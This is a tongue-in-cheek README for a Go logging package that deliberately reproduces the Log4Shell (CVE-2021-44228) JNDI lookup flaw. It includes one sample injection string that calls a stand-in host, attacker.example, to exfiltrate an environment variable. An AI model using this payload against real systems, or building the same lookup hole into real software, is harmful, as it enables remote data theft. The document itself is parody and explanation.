# an irresponsibly bad logging library

Is [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) making you feel left out as a Go programmer?

Fear not. We can fix that.

I wouldn't use this package, but if you want to...

```go
package main

import "github.com/bradfitz/jndi"

var logger = jndi.NewLogger()

func main() {
	//...
}

func handleSomeTraffic(r *request) {
        logger.Printf("got request from %s", r.URL.Path)
}
```

Congrats, the user actually wrote `${jndi:ldap://attacker.example/${env:${lower:u}ser}}` and
the logger expanded your environment variable and sent it over the network
as a side-effect of logging.

## Bugs

This package is incomplete. log4j actually does a bunch more:

* https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
* https://logging.apache.org/log4j/2.x/manual/lookups.html

Patches welcome to help flesh this package out. We've got some
catching up to do.
